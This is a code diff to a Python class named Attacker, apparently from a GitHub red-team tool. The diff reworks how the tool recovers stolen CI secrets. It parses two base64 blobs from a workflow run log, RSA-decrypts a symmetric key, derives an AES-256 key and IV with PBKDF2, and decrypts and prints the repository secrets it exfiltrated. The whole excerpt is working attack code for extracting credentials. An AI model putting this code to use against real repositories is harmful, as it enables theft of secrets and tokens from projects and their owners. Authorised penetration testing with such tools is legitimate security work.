@@ -9,6 +9,11 @@ from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives.ciphers import Cipher
+from cryptography.hazmat.primitives.ciphers import algorithms
+from cryptography.hazmat.primitives.ciphers import modes
+
+import hashlib
 
 from gato.github import Api
 from gato.git import Git
@@ -548,20 +553,36 @@ class Attacker:
                 print(res)
 
                 # Parse out the base64 blob with a regex.
-                matcher = re.compile(r'(?:[A-Za-z0-9+/]{4}){2,}(?:[A-Za-z0-9+/]{2}[AEIMQUYcgkosw048]=|[A-Za-z0-9+/][AQgw]==)')
+                matcher = re.compile(
+                              r'\$(?:[A-Za-z0-9+/]{4}){2,}(?:[A-Za-z0-9+/]{2}[AEIMQUYcgkosw048]=|[A-Za-z0-9+/][AQgw]==)?\$'
+                          )
 
                 blob = matcher.findall(res)
 
                 if len(blob) == 2:
-                    encrypted_secrets = base64.b64decode(blob[1])
-                    Output.owned(
-                        "Decrypted and Decoded Secrets:\n"
-                    )
+                    encrypted_secrets = base64.b64decode(blob[0][1:-1])
+                    salt = encrypted_secrets[8:16]
+                    ciphertext = encrypted_secrets[16:]
 
-                    plaintext = priv_key.decrypt(encrypted_secrets,
-                                                 padding.PKCS1v15()).decode()
+                    encrypted_key = base64.b64decode(blob[1][1:-1])
+                    sym_key_b64 = priv_key.decrypt(encrypted_key,
+                                                   padding.PKCS1v15()).decode()
+                    sym_key = base64.b64decode(sym_key_b64)
 
-                    print(plaintext)
+                    derived_key = hashlib.pbkdf2_hmac('sha256', sym_key, salt, 10000, 48)
+                    key = derived_key[0:32]
+                    iv = derived_key[32:48]
+
+                    cipher = Cipher(algorithms.AES256(key), modes.CBC(iv))
+                    decryptor = cipher.decryptor()
+
+                    Output.owned("Decrypted and Decoded Secrets:")
+
+                    cleartext = decryptor.update(ciphertext) + decryptor.finalize()
+                    cleartext = cleartext[:-cleartext[-1]]
+
+                    print(cleartext.decode('utf-8').strip())
+
                 else:
                     Output.error(
                         "Unable to extract encoded output from runlog!"
